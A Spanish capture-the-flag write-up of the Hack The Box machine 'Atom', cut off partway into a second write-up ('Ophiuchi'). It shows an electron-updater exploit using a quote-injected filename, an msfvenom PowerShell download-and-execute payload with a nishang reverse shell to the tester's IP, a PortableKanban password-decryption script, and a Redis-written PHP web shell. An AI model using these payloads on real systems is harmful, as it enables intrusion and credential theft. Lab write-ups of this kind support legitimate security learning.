\u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), RPC (135), https (443) abiertos, samba (445) y el puerto redis (6379).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  # Nmap 7.91 scan initiated Wed May 5 19:48:52 2021 as: nmap -p- --min-rate 10000 -oN allports -Pn 10.10.10.237 Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.14s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 6379/tcp open redis # Nmap done at Wed May 5 19:49:30 2021 -- 1 IP address (1 host up) scanned in 38.47 seconds # Nmap 7.91 scan initiated Wed May 5 19:50:09 2021 as: nmap -Pn -p80,135,443,445,6379 -sV -sC -oN serviceports 10.10.10.237 Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.069s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Heed Solutions 135/tcp open msrpc Microsoft Windows RPC 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Heed Solutions | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 6379/tcp open redis Redis key-value store Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h30m27s, deviation: 4h02m30s, median: 10m26s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: ATOM | NetBIOS computer name: ATOM\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-05-05T17:00:56-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-06T00:00:57 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 5 19:51:07 2021 -- 1 IP address (1 host up) scanned in 57.87 seconds   RPC Utilizamos rpcclient con una sesion nulla pero no tenemos permisos de acceso.\n1 2  λ ~ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.237 Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED   ENUM HTTP Encontramos una pagina web en el puerto 80 donde se presenta el software Heed en su version 1.0.0\nGOBUSTER Gobuster mostró el mismo resultado para el puerto http (80) y https (443).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  λ ~/htb/atom gobuster dir -u http://atom.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml /index.html (Status: 200) [Size: 7581] /images (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/images/] /Images (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/Images/] /releases (Status: 301) [Size: 332] [--\u0026gt; http://atom.htb/releases/] /Index.html (Status: 200) [Size: 7581] /examples (Status: 503) [Size: 398] /licenses (Status: 403) [Size: 417] /IMAGES (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/IMAGES/] /%20 (Status: 403) [Size: 298] /INDEX.html (Status: 200) [Size: 7581] /Releases (Status: 301) [Size: 332] [--\u0026gt; http://atom.htb/Releases/] /server-status (Status: 403) [Size: 417] λ ~/htb/atom gobuster dir -u https://atom.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml -k /images (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/images/] /index.html (Status: 200) [Size: 7581] /Images (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/Images/] /releases (Status: 301) [Size: 334] [--\u0026gt; https://atom.htb/releases/] /Index.html (Status: 200) [Size: 7581] /examples (Status: 503) [Size: 399] /licenses (Status: 403) [Size: 418] /IMAGES (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/IMAGES/] /%20 (Status: 403) [Size: 299] /INDEX.html (Status: 200) [Size: 7581] /Releases (Status: 301) [Size: 334] [--\u0026gt; https://atom.htb/Releases/] /server-status (Status: 403) [Size: 418]   HEED Encontramos un archivo zip el cual contiene el software presentado en la pagina, al extraerlo vemos un ejecutable.\n1 2  λ ~/htb/atom/tmp ls heed_setup_v1.0.0.zip \u0026#39;heedv1 Setup 1.0.0.exe\u0026#39;   El ejecutable parece ser un instalador, con winrar logramos obtener los archivos los cuales pertenecen a una aplicacion escrita con en Electron.\nVemos un archivo yaml (app-update.yml) el cual contiene una direccion que aparentemente es para realizar la actualizacion de la aplicacion.\n1 2 3 4  provider: generic url: \u0026#39;http://updates.atom.htb\u0026#39; publisherName: - HackTheBox   La aplicacion solo crea y elimina notas, y al iniciar busca actualizaciones.\nHEED CODE Utilizando npx con al archivo app.asar logramos obtener el codigo fuente, no encontramos direcciones de base de datos, la aplicacion solo funciona de forma local y temporal en cuanto a la informacion.\n1 2  # extract npx asar extract app.asar app_extract   Vemos que utiliza un modulo para \u0026ldquo;actualizar\u0026rdquo; la aplicacion: electron-updater - ^2.23.3.\n1 2 3 4 5 6 7 8 9 10 11 12  { \u0026#34;name\u0026#34;: \u0026#34;heedv2\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;main.js\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Open Source Application provided by HackTheBox\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;MrR3boot\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;electron-log\u0026#34;: \u0026#34;^1.3.0\u0026#34;, \u0026#34;electron-updater\u0026#34;: \u0026#34;^2.23.3\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;^0.11.0\u0026#34; } }   ENUM SAMBA CME Utilizamos esta herramienta para obtener informacion del servicio de SAMBA con una sesion null, vemos los recursos compartidos, tenemos permisos en el recurso Software_Updates.\n1 2 3 4 5 6 7 8 9 10 11  λ ~/htb/atom cme smb --shares atom.htb -u \u0026#39;null\u0026#39; -p \u0026#39;null\u0026#39; SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\null:null SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ Remote Admin SMB 10.10.10.237 445 ATOM C$ Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE λ ~/htb/atom   SMBCLIENT Con smbclient logramos enumerar el recurso donde vemos un archivo pdf.\n1 2 3 4 5 6 7 8 9 10 11 12  λ ~/htb/atom smbclient \\\\\\\\atom.htb\\\\Software_updates -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Thu May 6 02:17:47 2021 .. D 0 Thu May 6 02:17:47 2021 client1 D 0 Thu May 6 02:17:47 2021 client2 D 0 Thu May 6 02:17:47 2021 client3 D 0 Thu May 6 02:17:47 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 07:18:08 2021 4413951 blocks of size 4096. 1262822 blocks available smb: \\\u0026gt;   El archivo es la documentacion del equipo de QA \u0026hellip; menciona que antes de liberar una nueva version se realizan pruebas por parte del equipo, y para ello se debe de colocar en las carpetas de \u0026ldquo;cliente\u0026rdquo;, las cuales encontramos en el recurso Software_Updates aunque no especifica si es un archivo ejecutable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  Heedv1.0 Internal QA Documentation What is Heed ? Note taking application built with electron-builder which helps users in taking important notes. Features ? Very limited at the moment. There’s no server interaction when creating notes. So currently it just acts as a one-tier thick client application. We are planning to move it to a full fledged two-tier architecture sometime in the future releases. What about QA ? We follow the below process before releasing our products. 1. Build and install the application to make sure it works as we expect it to be. 2. Make sure that the update server running is in a private hardened instance. To initiate the QA process, just place the updates in one of the \u0026#34;client\u0026#34; folders, and the appropriate QA team will test it to ensure it finds an update and installs it correctly. 3. Follow the checklist to see if all given features are working as expected by the developer.   JASON - USER RCE - ELECTRON-UPDATER Realizamos una busqueda de vulnerabilidades en Electron Updater y encontramos un post en el que explica que con un archivo .yml es posible ejecutar un exe y comandos, modificando la direccion url y path. En cuanto al exe, es decir v’ulnerable-app-setup-1.2.3.exe con una comilla simple se ejecutaría, por otro lado para ejecutar comandos se utilizan comillas dobles v';calc;'ulnerable-app-setup-1.2.3.exe.\n1 2 3 4 5 6 7 8 9  #latest.ymlversion:1.2.3files:- url:v\u0026#39;;calc;\u0026#39;ulnerable-app-setup-1.2.3.exesha512:GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==size:44653912path:v\u0026#39;;calc;\u0026#39;ulnerable-app-1.2.3.exesha512:GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==releaseDate:\u0026#39;2019-11-20T11:17:02.627Z\u0026#39;  Despues de realizar diferentes modificaciones al archivo latest.yml logramos ejecutar nuestra shell cambiando el nombre del archivo.\nyaml bash  1 2 3 4 5 6 7 8  version:6.1.0files:- url:http://10.10.14.18/pay\u0026#39;load.exe sha512: 0wdfkI8aLN9XrsK/JpYCtxTnvnPi3+ezGGIU72KpGCzEaANmsQh7/ohmRNDHFyxnr/OIqWLa6wqr72l1rMd3xg== size: 73802 path: pay\u0026#39;load.exesha512:0wdfkI8aLN9XrsK/JpYCtxTnvnPi3+ezGGIU72KpGCzEaANmsQh7/ohmRNDHFyxnr/OIqWLa6wqr72l1rMd3xg==releaseDate:\u0026#39;2021-05-05T11:17:02.627Z\u0026#39;    1 2 3 4 5 6 7 8  # Reverse shell echo \u0026#34;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 1338\u0026#34; \u0026gt;\u0026gt; nishang.ps1 # EXE msfvenom -a x86 --platform Windows -p windows/exec CMD=\u0026#34;powershell \\\u0026#34;IEX(New-Object Net.webClient).downloadString(\u0026#39;http://10.10.14.18/nishang.ps1\u0026#39;)\\\u0026#34;\u0026#34; -f exe -o payload.exe # SHA512 shasum -a 512 \u0026#34;pay\u0026#39;load.exe\u0026#34; | cut -d \u0026#34; \u0026#34; -f1 | xxd -r -p | base64 | tr -d \u0026#34;$\\n\u0026#34; mv payload.exe \u0026#34;pay\u0026#39;load.exe\u0026#34; python3 -m http.server 80       'use strict'; var containerId = JSON.parse(\"\\\"1c15f6c25d7373af\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Para ejecutar comandos se agregan al nombre del archivo.\n1  # mv payload.exe \u0026#34;pay\u0026#39;;nslookup test.local 10.10.14.18;\u0026#39;load.exe\u0026#34;  Obtuvimos nuestra shell con el usuario Jason y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11  λ ~/htb/atom nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.18] from atom.htb [10.10.10.237] 61151 Windows PowerShell running as user jason on ATOM Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\WINDOWS\\system32\u0026gt;whoami atom\\jason PS C:\\WINDOWS\\system32\u0026gt; type C:\\Users\\jason\\Desktop\\user.txt 13b9e357b45b1e0b0ff69bb4a5ee573c PS C:\\WINDOWS\\system32\u0026gt;   PRIVILEGE ESCALATION PORTABLE KANBAN Enumerando las carpetas del usuario Jason encontramos PortableKanban, en el archivo de configuracion PortableKanban.cfg encontramos una contraseña encriptada.\n1 2 3  PS C:\\Users\\Jason\\Downloads\\portablekanban\u0026gt; cat C:\\Users\\Jason\\Downloads\\portablekanban\\PortableKanban.cfg {\u0026#34;RoamingSettings\u0026#34;:{\u0026#34;DataSource\u0026#34;:\u0026#34;RedisServer\u0026#34;,\u0026#34;DbServer\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;DbPort\u0026#34;:6379,\u0026#34;DbEncPassword\u0026#34;:\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34;,\u0026#34;DbServer2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbPort2\u0026#34;:6379,\u0026#34;DbEncPassword2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbIndex\u0026#34;:0,\u0026#34;DbSsl\u0026#34;:false,[... REDACTED ... ]} PS C:\\Users\\Jason\\Downloads\\portablekanban\u0026gt;   Además encontramos un exploit con el cual logramos obtener en texto plano la contraseña.\n1 2 3 4 5 6 7 8 9 10  # Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval import base64 from des import * #python3 -m pip install des def decode(hash): hash = base64.b64decode(hash.encode(\u0026#39;utf-8\u0026#39;)) key = DesKey(b\u0026#34;7ly6UznJ\u0026#34;) return key.decrypt(hash,initial=b\u0026#34;XuVUm5fR\u0026#34;,padding=True).decode(\u0026#39;utf-8\u0026#39;) print(decode(\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34;)) # kidvscat_yes_kidvscat   REDIS Utilizamos la contraseña con redis-cli ya que existe el puerto 6379 abierto, encontramos una contraseña encriptada en una de las KEYS del \u0026ldquo;usuario\u0026rdquo; Administrator, utilizamos nuevamente el exploit para obtener en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  λ ~/htb/atom/wwww redis-cli -h 10.10.10.237 -a \u0026#34;kidvscat_yes_kidvscat\u0026#34; Warning: Using a password with \u0026#39;-a\u0026#39; or \u0026#39;-u\u0026#39; option on the command line interface may not be safe. 10.10.10.237:6379\u0026gt; ping PONG 10.10.10.237:6379\u0026gt; keys * 1) \u0026#34;pk:ids:MetaDataClass\u0026#34; 2) \u0026#34;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\u0026#34; 3) \u0026#34;pk:ids:User\u0026#34; 4) \u0026#34;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff\u0026#34; 10.10.10.237:6379\u0026gt; get pk:ids:MetaDataClass (error) WRONGTYPE Operation against a key holding the wrong kind of value 10.10.10.237:6379\u0026gt; get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 \u0026#34;{\\\u0026#34;Id\\\u0026#34;:\\\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\\\u0026#34;,\\\u0026#34;Name\\\u0026#34;:\\\u0026#34;Administrator\\\u0026#34;,\\\u0026#34;Initials\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;Email\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;EncryptedPassword\\\u0026#34;:\\\u0026#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\\u0026#34;,\\\u0026#34;Role\\\u0026#34;:\\\u0026#34;Admin\\\u0026#34;,\\\u0026#34;Inactive\\\u0026#34;:false,\\\u0026#34;TimeStamp\\\u0026#34;:637530169606440253}\u0026#34; 10.10.10.237:6379\u0026gt; get pk:ids:User (error) WRONGTYPE Operation against a key holding the wrong kind of value 10.10.10.237:6379\u0026gt; get pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff \u0026#34;{\\\u0026#34;Id\\\u0026#34;:\\\u0026#34;ffffffffffffffffffffffffffffffff\\\u0026#34;,\\\u0026#34;SchemaVersion\\\u0026#34;:\\\u0026#34;4.2.0.0\\\u0026#34;,\\\u0026#34;SchemaVersionModified\\\u0026#34;:\\\u0026#34;\\\\/Date(1617420120000-0700)\\\\/\\\u0026#34;,\\\u0026#34;SchemaVersionModifiedBy\\\u0026#34;:\\\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\\\u0026#34;,\\\u0026#34;SchemaVersionChecked\\\u0026#34;:\\\u0026#34;\\\\/Date(-62135596800000-0000)\\\\/\\\u0026#34;,\\\u0026#34;SchemaVersionCheckedBy\\\u0026#34;:\\\u0026#34;00000000000000000000000000000000\\\u0026#34;,\\\u0026#34;TimeStamp\\\u0026#34;:637530169345346438}\u0026#34; (0.54s) 10.10.10.237:6379\u0026gt;   Verificamos con crackmapexec, vemos que es la contraseña de Administrator y tenemos acceso completo.\n1 2 3 4 5 6 7 8 9 10 11  λ ~/htb/atom/wwww cme smb -u Administrator -p \u0026#34;kidvscat_admin_@123\u0026#34; --shares 10.10.10.237 SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\Administrator:kidvscat_admin_@123 (Pwn3d!) SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ READ,WRITE Remote Admin SMB 10.10.10.237 445 ATOM C$ READ,WRITE Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE λ ~/htb/atom/wwww   WINRM Por alguna razon el puerto de winrm no apareció en nmap, utilizamos este ultimo puerto para obtener una shell y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  λ ~/htb/atom/wwww evil-winrm -i 10.10.10.237 -u Administrator -p \u0026#34;kidvscat_admin_@123\u0026#34; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami atom\\administrator *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 5/6/2021 4:43 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt 50448bb96c0c36cbc2b89e9bebff9588 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt;   REDIS TO ROOT Tambien mediante Redis logramos ejecutar comandos, modificando la configuracion de redis para escribir una web shell, similar a Postman - HTB.\n1 2 3 4 5 6 7 8 9  λ ~/htb/atom redis-cli -h 10.10.10.237 -a \u0026#34;kidvscat_yes_kidvscat\u0026#34; Warning: Using a password with \u0026#39;-a\u0026#39; or \u0026#39;-u\u0026#39; option on the command line interface may not be safe. 10.10.10.237:6379\u0026gt; config set dbfilename redis.php OK 10.10.10.237:6379\u0026gt; set test \u0026#34;\u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt;\u0026#34; OK 10.10.10.237:6379\u0026gt; save OK 10.10.10.237:6379\u0026gt;   Tambien encontramos las KEYS en nuestra webshell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  λ ~/htb/atom/wwww curl -sX GET \u0026#34;http://atom.htb/redis.php?cmd=whoami%20/all\u0026#34; -o out.txt; cat out.txt REDIS0006 pk:ids:User$e8e29158-d70d-44b1-a1ba-4949d52790a0�9pk:urn:metadataclass:f-@�ff��J{\u0026#34;Id\u0026#34;:\u0026#34;f�\u0026#34;,\u0026#34;SchemaVersion 24.2.0.0�Modifie@T\\/Date(1617420120 -0700)\\/�6By Ze8e29158d70d44b1a1ba4949d52790a�sCheck�r -621355968 r@t � t7`s !� TimeStamp\u0026#34;:637530169345346438}test$ USER INFORMATION ---------------- User Name SID =================== ======== nt authority\\system S-1-5-18 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== BUILTIN\\Administrators Alias S-1-5-32-544 Enabled by default, Enabled group, Group owner Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group Mandatory Label\\System Mandatory Level Label S-1-16-16384 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeLockMemoryPrivilege Lock pages in memory Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeTcbPrivilege Act as part of the operating system Enabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeCreatePermanentPrivilege Create permanent shared objects Enabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Enabled SeAuditPrivilege Generate security audits Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 52790a0\u0026#34;,\u0026#34;Name )29158-d70d-44b1-a1ba-4949d52790a0���{\u0026#34;Id\u0026#34;:\u0026#34;e8e29158d70d44b1a1ba4949d Email Administrator Initials ncryptedPasswor@fOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi ARol�f Inactiv f de,\u0026#34;TimeStamp\u0026#34;:637530169606440253}pk:ids:MetaDataClass�$ff-@�ffs-key$[ ... REDACTED ... ] � λ ~/htb/atom/wwww   REDIS PROCESS Con la shell que obtuvimos con WINRM encontramos que redis-server esta siendo ejecutado por el administrador y es por eso que logramos ejecutar comandos privilegiados en REDIS TO ROOT.\n1 2 3 4 5  *Evil-WinRM* PS C:\\xampp\\htdocs\u0026gt; Get-Process -Name redis-server -IncludeUserName Handles WS(K) CPU(s) Id UserName ProcessName ------- ----- ------ -- -------- ----------- 126 20628 0.61 7712 NT AUTHORITY\\NETWOR... redis-server   ","description":"Atom presenta una aplicacion Electron. Explotamos una vulnerabilidad en un modulo de actualizacion que permitio ejecutar comandos a través de un archivo de actualizacion y acceso al servidor de actualizaciones. Obtuvimos credenciales a través de Portable Kanban lo que nos dio acceso a Redis donde encontramos la contraseña del administrador. Tambien, por medio de Redis escribimos una web shell que nos dio acceso privilegiado.","id":2,"section":"posts","tags":["electron","npm","npx","yaml","rce","portable kanban","redis","winrm"],"title":"Hack The Box - Atom","uri":"https://sckull.github.io/posts/atom/"},{"content":"  Ophiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina. Mediante el analisis de un archivo en Go se creó un archivo WebAssembly para ejecutar un script en bash el cual proporciona permisos sobre bash para finalmente obtener acceso como root.\n   Nombre Ophiuchi      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.227   Maker felamos    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[4.8, 5, 5.2, 4.8, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (8080) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.91 scan initiated Fri Apr 2 02:24:15 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.227 Warning: 10.10.10.227 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.089s latency). Not shown: 44312 closed ports, 21221 filtered ports PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy # Nmap done at Fri Apr 2 02:25:19 2021 -- 1 IP address (1 host up) scanned in 63.77 seconds # Nmap 7.91 scan initiated Fri Apr 2 02:26:02 2021 as: nmap -p 22,8080 -sV -sC -oN servicesports 10.10.10.227 Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.065s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA) | 256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA) |_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519) 8080/tcp open http Apache Tomcat 9.0.38 |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 2 02:26:12 2021 -- 1 IP address (1 host up) scanned in 10.10 seconds   HTTP Encontramos una pagina web en el puerto 8080 en la cual es posible parsear sintaxis YAML, aunque al enviar una sintaxis se muestra un mensaje el cual indica que ha sido removida esta funcionalidad.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t 50 /test (Status: 302) /manager (Status: 302) /yaml (Status: 302)   TOMCAT En las direcciones encontradas vemos el panel de login basico de TOMCAT.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  HTTP/1.1 401 Cache-Control: private Expires: Thu, 01 Jan 1970 00:00:00 GMT WWW-Authenticate: Basic realm=\u0026#34;Tomcat Manager Application\u0026#34; Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2499 Date: Sat, 03 Apr 2021 06:08:57 GMT \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;!-- BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;} H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} PRE, TT {border: 1px dotted #525D76} A {color : black;}A.name {color : black;} --\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;401 